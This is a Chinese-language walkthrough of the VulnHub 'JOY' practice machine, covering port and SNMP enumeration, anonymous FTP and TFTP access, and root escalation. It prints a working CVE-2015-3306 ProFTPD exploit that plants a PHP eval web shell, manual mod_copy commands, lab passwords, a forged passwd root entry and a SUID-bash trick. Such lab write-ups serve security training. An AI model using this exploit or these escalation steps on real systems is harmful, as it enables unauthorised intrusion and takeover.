## port scan

```shell
# Nmap 7.94SVN scan initiated Mon Feb  3 03:37:49 2025 as: nmap -sT --min-rate 10000 -p- -oN nmap_result/port 192.168.28.21
Nmap scan report for 192.168.28.21 (192.168.28.21)
Host is up (0.00024s latency).
Not shown: 65523 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
465/tcp open  smtps
587/tcp open  submission
993/tcp open  imaps
995/tcp open  pop3s
```

```shell
# Nmap 7.94SVN scan initiated Mon Feb  3 03:38:42 2025 as: nmap -p21,22,25,80,110,139,143,445,465,587,993,995 -sVC -O -oN nmap_result/detils 192.168.28.21
Nmap scan report for 192.168.28.21 (192.168.28.21)
Host is up (0.00057s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
|_drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
22/tcp  open  ssh         Dropbear sshd 0.34 (protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2016-07-19 20:03  ossec/
|_
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL TOP CAPA RESP-CODES UIDL STLS AUTH-RESP-CODE PIPELINING
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG
| Not valid before: 2019-01-27T17:23:23
|_Not valid after:  2032-10-05T17:23:23
|_ssl-date: TLS randomness does not represent time
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG
| Not valid before: 2019-01-27T17:23:23
|_Not valid after:  2032-10-05T17:23:23
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: more Pre-login have LOGIN-REFERRALS STARTTLS post-login ENABLE LOGINDISABLEDA0001 capabilities SASL-IR listed OK IMAP4rev1 LITERAL+ IDLE ID
445/tcp open  netbios-ssn Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)
465/tcp open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
587/tcp open  smtp        Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
993/tcp open  ssl/imap    Dovecot imapd
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG
| Not valid before: 2019-01-27T17:23:23
|_Not valid after:  2032-10-05T17:23:23
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: Pre-login more LOGIN-REFERRALS have post-login ENABLE ID capabilities SASL-IR listed OK LITERAL+ IMAP4rev1 IDLE AUTH=PLAINA0001
995/tcp open  ssl/pop3    Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG
| Not valid before: 2019-01-27T17:23:23
|_Not valid after:  2032-10-05T17:23:23
|_pop3-capabilities: SASL(PLAIN) TOP CAPA RESP-CODES UIDL PIPELINING AUTH-RESP-CODE USER
MAC Address: 00:0C:29:DE:1F:04 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts: The,  JOY.localdomain, JOY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.12-Debian)
|   Computer name: joy
|   NetBIOS computer name: JOY\x00
|   Domain name: \x00
|   FQDN: joy
|_  System time: 2025-02-03T16:38:56+08:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: JOY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: -2h39m59s, deviation: 4h37m07s, median: 0s
| smb2-time: 
|   date: 2025-02-03T08:38:56
|_  start_date: N/A
```

ftp,ssh,smb,smtp,http服务存在

## ftp

可以匿名登录

```shell
ftp> cd upload
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||52242|)
150 Opening ASCII mode data connection for file list
-rwxrwxr-x   1 ftp      ftp         23357 Feb  3 17:27 directory
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_armadillo
-rw-rw-rw-   1 ftp      ftp            25 Jan  6  2019 project_bravado
-rw-rw-rw-   1 ftp      ftp            88 Jan  6  2019 project_desperado
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_emilio
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_flamingo
-rw-rw-rw-   1 ftp      ftp             7 Jan  6  2019 project_indigo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_komodo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_luyano
-rw-rw-rw-   1 ftp      ftp             8 Jan  6  2019 project_malindo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_okacho
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_polento
-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_ronaldinho
-rw-rw-rw-   1 ftp      ftp            55 Jan  6  2019 project_sicko
-rw-rw-rw-   1 ftp      ftp            57 Jan  6  2019 project_toto
-rw-rw-rw-   1 ftp      ftp             5 Jan  6  2019 project_uno
-rw-rw-rw-   1 ftp      ftp             9 Jan  6  2019 project_vivino
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_woranto
-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_yolo
-rw-rw-rw-   1 ftp      ftp           180 Jan  6  2019 project_zoo
-rwxrwxr-x   1 ftp      ftp            24 Jan  6  2019 reminder
226 Transfer complete
```

文件全部下载下来

```
ftp> prompt
Interactive mode off.
ftp> mget *
```

或者

```
wget -m ftp://anonymous:anonymous@192.168.28.21
```

查看文件`directory`

```shell
└─$ cat upload/directory 
Patrick's Directory

total 132
-rw-r--r--  1 patrick patrick  407 Jan 27  2019 version_control
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Videos

You should know where the directory can be accessed.

Information of this Machine!

Linux JOY 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
```

Patrick目录有一个`version_control`文件，并提示我们可以访问这个目录

web目录枚举没有结果，smb无法利用

扫描udp协议服务

```
sudo nmap -sU --min-rate 10000 -p- 192.168.28.21
```

```shell
Nmap scan report for 192.168.28.21 (192.168.28.21)
Host is up (0.0012s latency).
Not shown: 65454 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
PORT    STATE SERVICE
123/udp open  ntp
137/udp open  netbios-ns
161/udp open  snmp
MAC Address: 00:0C:29:DE:1F:04 (VMware)
```

```
sudo nmap -sU -sVC -O -p123,137,161 192.168.28.21
```

```
PORT    STATE SERVICE    VERSION
123/udp open  ntp        NTP v4 (secondary server)
137/udp open  netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP)
| nbns-interfaces: 
|   hostname: JOY
|   interfaces: 
|_    192.168.28.21
161/udp open  snmp       SNMPv1 server; net-snmp SNMPv3 server (public)
|_  System uptime: 1h11m38.18s (429818 timeticks)
| snmp-netstat: 
|   TCP  0.0.0.0:21           0.0.0.0:0
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  0.0.0.0:25           0.0.0.0:0
|   TCP  0.0.0.0:110          0.0.0.0:0
|   TCP  0.0.0.0:139          0.0.0.0:0
|   TCP  0.0.0.0:143          0.0.0.0:0
|   TCP  0.0.0.0:445          0.0.0.0:0
|   TCP  0.0.0.0:465          0.0.0.0:0
|   TCP  0.0.0.0:587          0.0.0.0:0
|   TCP  0.0.0.0:993          0.0.0.0:0
|   TCP  0.0.0.0:995          0.0.0.0:0
|   TCP  127.0.0.1:631        0.0.0.0:0
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   UDP  0.0.0.0:68           *:*
|   UDP  0.0.0.0:123          *:*
|   UDP  0.0.0.0:137          *:*
|   UDP  0.0.0.0:138          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:631          *:*
|   UDP  0.0.0.0:1900         *:*
|   UDP  0.0.0.0:5353         *:*
|   UDP  0.0.0.0:34450        *:*
|   UDP  0.0.0.0:36969        *:*
|   UDP  0.0.0.0:52854        *:*
|   UDP  127.0.0.1:123        *:*
|   UDP  192.168.28.21:123    *:*
|   UDP  192.168.28.21:137    *:*
|   UDP  192.168.28.21:138    *:*
|   UDP  192.168.28.255:137   *:*
|_  UDP  192.168.28.255:138   *:*
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Traffic stats: 90.83 Kb sent, 90.83 Kb received
|   Intel Corporation 82545EM Gigabit Ethernet Controller (Copper)
|     IP address: 192.168.28.21  Netmask: 255.255.255.0
|     MAC address: 00:0c:29:de:1f:04 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|_    Traffic stats: 477.53 Mb sent, 148.57 Mb received
| snmp-processes:
|   773: 
|     Name: in.tftpd
|     Path: /usr/sbin/in.tftpd
|     Params: --listen --user tftp --address 0.0.0.0:36969 --secure /home/patrick
```

## snmp协议

**SNMP - 简单网络管理协议**是一种用于监控网络中不同设备的协议

通过上面结果，发现36969端口运行着tftp服务，并且指定为/home/patrick家目录

### tftp

```
┌──(kali㉿kali)-[~/vulnhub/JOY]
└─$ tftp 192.168.28.21 36969        
tftp> get version_control
tftp> get 123
Error code 1: File not found
```

```shell
┌──(kali㉿kali)-[~/vulnhub/JOY]
└─$ cat version_control 
Version Control of External-Facing Services:

Apache: 2.4.25
Dropbear SSH: 0.34
ProFTPd: 1.3.5
Samba: 4.5.12

We should switch to OpenSSH and upgrade ProFTPd.

Note that we have some other configurations in this machine.
1. The webroot is no longer /var/www/html. We have changed it to /var/www/tryingharderisjoy.
2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.
```

给出了一些服务版本信息，还有web的根目录是`/var/www/tryingharderisjoy`

```
searchsploit ProFTPd 1.3.5
```

![image-20250204161657480](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250204161657480.png)

存在rce漏洞

```python
#!/usr/bin/env python
# CVE-2015-3306 exploit by t0kx
# https://github.com/t0kx/exploit-CVE-2015-3306

import re
import socket
import requests
import argparse

class Exploit:
    def __init__(self, host, port, path):
        self.__sock = None
        self.__host = host
        self.__port = port
        self.__path = path

    def __connect(self):
        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__sock.connect((self.__host, self.__port))
        self.__sock.recv(1024)

    def __exploit(self):
        payload = "<?php eval($_POST['cmd']); ?>"
        self.__sock.send(b"site cpfr /proc/self/cmdline\n")
        self.__sock.recv(1024)
        self.__sock.send(("site cpto /tmp/." + payload + "\n").encode("utf-8"))
        self.__sock.recv(1024)
        self.__sock.send(("site cpfr /tmp/." + payload + "\n").encode("utf-8"))
        self.__sock.recv(1024)
        self.__sock.send(("site cpto "+ self.__path +"/backdoor.php\n").encode("utf-8"))

        if "Copy successful" in str(self.__sock.recv(1024)):
            print("[+] Target exploited, acessing shell at http://" + self.__host + "/backdoor.php")
            print("[+] Done")
        else:
            print("[!] Failed")

    def run(self):
        self.__connect()
        self.__exploit()

def main(args):
    print("[+] CVE-2015-3306 exploit by t0kx")
    print("[+] Exploiting " + args.host + ":" + args.port)

    exploit = Exploit(args.host, int(args.port), args.path)
    exploit.run()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', required=True)
    parser.add_argument('--port', required=True)
    parser.add_argument('--path', required=True)
    args = parser.parse_args()

    main(args)
```

```shell
┌──(kali㉿kali)-[~/vulnhub/JOY]
└─$ python3 exploit.py --host 192.168.28.21 --port 21 --path '/var/www/tryingharderisjoy'
[+] CVE-2015-3306 exploit by t0kx
[+] Exploiting 192.168.28.21:21
[+] Target exploited, acessing shell at http://192.168.28.21/backdoor.php
[+] Done
```

或者手动复制

首先，ftp上传php文件，然后将它复制到web目录即可

```shell
┌──(kali㉿kali)-[~/vulnhub/JOY]
└─$ telnet 192.168.28.21 21
Trying 192.168.28.21...
Connected to 192.168.28.21.
Escape character is '^]'.
220 The Good Tech Inc. FTP Server
site cpfr /home/ftp/1.php
350 File or directory exists, ready for destination name
site cpto /var/www/tryingharderisjoy/1.php
250 Copy successful
```

```
telnet 192.168.28.21 21
site cpfr /home/ftp/1.php
site cpto /var/www/tryingharderisjoy/1.php
```

## 提权

web目录下发现凭据

`/var/www/tryingharderisjoy/ossec/patricksecretsofjoy`

```
credentials for JOY:
patrick:apollo098765
root:howtheheckdoiknowwhattherootpasswordis

how would these hack3rs ever find such a page?
```

切换到patrick

```shell
patrick@JOY:~$ sudo -l
Matching Defaults entries for patrick on JOY:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User patrick may run the following commands on JOY:
    (ALL) NOPASSWD: /home/patrick/script/test
```

有sudo权限

但是script目录只能root可以查看，经过尝试给`script`目录权限

```shell
patrick@JOY:~$ sudo /home/patrick/script/test
I am practising how to do simple bash scripting!
What file would you like to change permissions within this directory?

What permissions would you like to set the file to?
777
Currently changing file permissions, please wait.
Tidying up...
Done!
```

test内容为：

```sh
#!/bin/sh

echo "I am practising how to do simple bash scripting!"
sleep 3

echo "What file would you like to change permissions within this directory?"

read file
sleep 3

echo "What permissions would you like to set the file to?"

read permissions
sleep 3

echo "Currently changing file permissions, please wait."
sleep 3

chmod $permissions /home/patrick/script/$file
echo "Tidying up..."
sleep 3

echo "Done!"
```

我们可以通过../，给一些特殊文件权限（例如：passwd，shadow，sudoers等）

```
openssl passwd -1 -salt somesalt 123456 > hash.txt
corr:$1$somesalt$uGkN1R3BfqJr15hKXW5jt.:0:0::/root:/bin/bash
```

```shell
root@JOY:~# ls
author-secret.txt      dovecot.crt  dovecot.key     proof.txt   rootCA.pem
document-generator.sh  dovecot.csr  permissions.sh  rootCA.key  rootCA.srl
root@JOY:~# cat proof.txt 
Never grant sudo permissions on scripts that perform system functions!
```

或者通过ftp进行修改test文件提权，或者直接给test文件写权限，修改该文件即可

```shell
patrick@JOY:~/script$ echo 'cp /bin/bash /tmp/bash;chmod +s /tmp/bash' > test
patrick@JOY:~/script$ cd /tmp
patrick@JOY:/tmp$ ls
bash
patrick@JOY:/tmp$ ./bash -p
bash-4.4# id
uid=1000(patrick) gid=1000(patrick) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner),1000(patrick),1001(ftp)
```

